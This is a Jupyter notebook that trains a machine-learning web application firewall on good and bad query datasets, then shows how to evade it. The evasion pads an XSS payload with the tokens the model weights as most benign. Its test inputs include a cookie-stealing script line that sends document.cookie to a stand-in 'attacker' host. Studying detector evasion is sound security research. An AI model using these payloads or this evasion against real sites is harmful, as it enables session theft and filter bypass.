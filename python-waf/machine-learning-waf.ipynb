{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "iU4wgncUuCg4"
   },
   "source": [
    "# Machine Learning WAF - Web Application Firewall\n",
    "Sources:\n",
    "* https://github.com/faizann24/Fwaf-Machine-Learning-driven-Web-Application-Firewall\n",
    "* https://github.com/oreilly-mlsec/book-resources/tree/master/chapter8/waf"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Import libraries and load data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "c3nHwBjFuCg8"
   },
   "outputs": [],
   "source": [
    "import os, urllib.parse, pickle\n",
    "import numpy as np\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.feature_extraction.text import TfidfVectorizer\n",
    "from sklearn.linear_model import LogisticRegression\n",
    "from sklearn.pipeline import Pipeline\n",
    "from sklearn import metrics\n",
    "\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "3gi1j7L8uChU"
   },
   "outputs": [],
   "source": [
    "def loadFile(name):\n",
    "    directory = str(os.getcwd())\n",
    "    filepath = os.path.join(directory, name)\n",
    "    with open(filepath, 'r', encoding='utf-8') as f:\n",
    "        data = f.readlines()\n",
    "    data = list(set(data))\n",
    "    result = []\n",
    "    for d in data:\n",
    "        d = str(urllib.parse.unquote(d))   #converting url encoded data to simple string\n",
    "        result.append(d)\n",
    "    return result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 374
    },
    "colab_type": "code",
    "id": "NhHHgsftuChi",
    "outputId": "b3f180ef-2031-46d6-e641-7b8a18e8f326"
   },
   "outputs": [],
   "source": [
    "!wget https://github.com/fisher85/ml-cybersecurity/blob/master/python-waf/badqueries.zip?raw=true -O badqueries.zip\n",
    "!unzip -u badqueries.zip\n",
    "\n",
    "badQueries = loadFile('badqueries.txt')\n",
    "badQueries[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 374
    },
    "colab_type": "code",
    "id": "7hVVg750uCh2",
    "outputId": "07a9d912-70d4-411b-a343-f72d7f8ae359"
   },
   "outputs": [],
   "source": [
    "!wget https://github.com/fisher85/ml-cybersecurity/blob/master/python-waf/goodqueries.zip?raw=true -O goodqueries.zip\n",
    "!unzip -u goodqueries.zip\n",
    "\n",
    "validQueries = loadFile('goodqueries.txt')\n",
    "validQueries[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "LRmVMzgxuCiD"
   },
   "outputs": [],
   "source": [
    "badQueries = list(set(badQueries))\n",
    "validQueries = list(set(validQueries))\n",
    "allQueries = badQueries + validQueries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "YHeL4VLduCiR"
   },
   "outputs": [],
   "source": [
    "yBad = [1 for i in range(0, len(badQueries))]  #labels, 1 for malicious and 0 for clean\n",
    "yGood = [0 for i in range(0, len(validQueries))]\n",
    "y = yBad + yGood\n",
    "queries = allQueries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "The operation may take a long time, 3-5 minutes depending on the computer performance. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 238
    },
    "colab_type": "code",
    "id": "WvCcUEX-uCiw",
    "outputId": "9c499f3e-70c9-4ca6-d5fe-ed3a87560c50"
   },
   "outputs": [],
   "source": [
    "# vectorizer = TfidfVectorizer(min_df = 0.0, analyzer=\"char\", sublinear_tf=True, ngram_range=(1,3)) # converting data to vectors\n",
    "# X = vectorizer.fit_transform(queries)\n",
    "\n",
    "# X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) # splitting data\n",
    "\n",
    "# badCount = len(badQueries)\n",
    "# validCount = len(validQueries)\n",
    "\n",
    "# lgs = LogisticRegression(solver='lbfgs', class_weight={1: 2 * validCount / badCount, 0: 1.0}) # class_weight='balanced')\n",
    "# lgs.fit(X_train, y_train) # training our model"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "4n9NgQpLuCja"
   },
   "source": [
    "## Pickle model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 204
    },
    "colab_type": "code",
    "id": "f0AxcNjKuCjc",
    "outputId": "2ca1daf5-5a9a-4dca-b727-6b28d21e8cff"
   },
   "outputs": [],
   "source": [
    "!wget https://github.com/fisher85/ml-cybersecurity/blob/master/python-waf/trained_waf_model?raw=true -O trained_waf_model\n",
    "\n",
    "p = Pipeline([\n",
    "        ('vectorizer', vectorizer),\n",
    "        ('classifier', lgs)\n",
    "    ])\n",
    "\n",
    "pickle.dump(p, open('trained_waf_model', 'wb'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "M7Vz8n9buCjy"
   },
   "source": [
    "## Evaluation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 170
    },
    "colab_type": "code",
    "id": "5rZUokLuuCj0",
    "outputId": "0c2be06f-c740-4793-f211-a37ee4a692d5"
   },
   "outputs": [],
   "source": [
    "predicted = lgs.predict(X_test)\n",
    "\n",
    "fpr, tpr, _ = metrics.roc_curve(y_test, (lgs.predict_proba(X_test)[:, 1]))\n",
    "auc = metrics.auc(fpr, tpr)\n",
    "\n",
    "print(\"Bad samples: %d\" % badCount)\n",
    "print(\"Good samples: %d\" % validCount)\n",
    "print(\"Baseline Constant negative: %.6f\" % (validCount / (validCount + badCount)))\n",
    "print(\"------------\")\n",
    "print(\"Accuracy: %f\" % lgs.score(X_test, y_test))  #checking the accuracy\n",
    "print(\"Precision: %f\" % metrics.precision_score(y_test, predicted))\n",
    "print(\"Recall: %f\" % metrics.recall_score(y_test, predicted))\n",
    "print(\"F1-Score: %f\" % metrics.f1_score(y_test, predicted))\n",
    "print(\"AUC: %f\" % auc)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "nOnkpkAHuCkC"
   },
   "source": [
    "## Use pretrained model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "xI9wN_6vuCkF"
   },
   "outputs": [],
   "source": [
    "p = pickle.load(open('trained_waf_model', 'rb'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 85
    },
    "colab_type": "code",
    "id": "N2-6VnAxuCkS",
    "outputId": "6dfef3f7-3fa8-4e13-e4a2-6353997eac2f"
   },
   "outputs": [],
   "source": [
    "input_data = [\n",
    "    '<script></script>',\n",
    "    'hello.us',\n",
    "    'www.google.com',\n",
    "    \"<script>window.location='http://attacker/?cookie='+document.cookie</script>\"\n",
    "]\n",
    "\n",
    "pred = p.predict_proba(input_data).tolist()\n",
    "\n",
    "for i in range(len(pred)):\n",
    "    print(\"{:0.2f}%\\tmalicious:\\t{}\".format(pred[i][1]*100, input_data[i]))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "NB6JyVa2uCk6"
   },
   "source": [
    "## Binary classifier evasion"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 289
    },
    "colab_type": "code",
    "id": "iWAMRFQuuCk7",
    "outputId": "7033ff33-f55f-433d-b4d1-8f17a3c93a00"
   },
   "outputs": [],
   "source": [
    "vars(p)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "24Q_r5yTuClP"
   },
   "outputs": [],
   "source": [
    "vec = p.steps[0][1]\n",
    "clf = p.steps[1][1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 51
    },
    "colab_type": "code",
    "id": "4CwjOY6JuCla",
    "outputId": "8f49bbb4-3fd6-4776-db05-c5bbe337b627"
   },
   "outputs": [],
   "source": [
    "print(vec.idf_)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 51
    },
    "colab_type": "code",
    "id": "frDkTUByuCl0",
    "outputId": "5f63d1d5-458c-4839-a50d-3edef09e29a8"
   },
   "outputs": [],
   "source": [
    "print(clf.coef_)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 51
    },
    "colab_type": "code",
    "id": "CeOO8eK2uCmF",
    "outputId": "c25a5d1d-becd-4068-f3d1-e77fb5c55682"
   },
   "outputs": [],
   "source": [
    "term_influence = vec.idf_ * clf.coef_\n",
    "print(term_influence)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "id": "in-yN-vduCmb",
    "outputId": "a5f6f0f1-0dcf-45c8-d66e-8fa3493ae00b"
   },
   "outputs": [],
   "source": [
    "print(np.argpartition(term_influence, 1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 1000
    },
    "colab_type": "code",
    "id": "NllR_BANuCmv",
    "outputId": "de1b8b74-69eb-4168-a598-1df053fb802a"
   },
   "outputs": [],
   "source": [
    "vec.vocabulary_"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "W89J5d-HuCm3"
   },
   "outputs": [],
   "source": [
    "# First, we create a token vocabulary dictionary so that\n",
    "# we can access tokens by index.\n",
    "vocab = dict([(v,k) for k,v in vec.vocabulary_.items()])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "FR6HJvn-uCm_"
   },
   "outputs": [],
   "source": [
    "term_idx = np.argpartition(term_influence, 1)[0][0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "id": "cneESaixuCnM",
    "outputId": "febd2565-1590-4590-b249-2f92a23d5c4b"
   },
   "outputs": [],
   "source": [
    "print(vocab[term_idx])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "TiCgr1ZVuCnX"
   },
   "outputs": [],
   "source": [
    "payload = \"<script>alert(1)</script>\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "id": "vQ5YM1VNuCnn",
    "outputId": "53626a68-3cbe-4895-99d1-223455c0bb13"
   },
   "outputs": [],
   "source": [
    "p.predict([payload])[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "id": "Pomc4x4zuCnx",
    "outputId": "ecf21983-0cb3-4603-b6a5-3e5f6f6fdcdc"
   },
   "outputs": [],
   "source": [
    "p.predict_proba([payload])[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "id": "LQFxc4TwuCn8",
    "outputId": "82aecc22-9ed6-4a60-cda0-0a2f0a8c15db"
   },
   "outputs": [],
   "source": [
    "p.predict_proba([payload + '/' + vocab[term_idx]])[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "75lLa8tvuCoH"
   },
   "outputs": [],
   "source": [
    "# Find the multiplier value at which the classifier will start making errors\n",
    "multiplier = 100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "id": "-JpSpuiiuCoW",
    "outputId": "fee7f5e2-2baa-4b0a-fad4-01d9dc7c6177"
   },
   "outputs": [],
   "source": [
    "p.predict_proba([payload + '/' + vocab[term_idx]*multiplier])[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "id": "PLFcloTYuCop",
    "outputId": "c2a1827d-a01c-4bf4-892c-db222ba5c0c3"
   },
   "outputs": [],
   "source": [
    "p.predict([payload + '/' + vocab[term_idx]*multiplier])[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 54
    },
    "colab_type": "code",
    "id": "3aJtjAOvuCoy",
    "outputId": "f2f7e75a-22cd-4e04-a0ce-e1c0164a2cf3"
   },
   "outputs": [],
   "source": [
    "print(payload + '/' + vocab[term_idx]*multiplier)"
   ]
  }
 ],
 "metadata": {
  "colab": {
   "name": "machine-learning-waf.ipynb",
   "provenance": []
  },
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
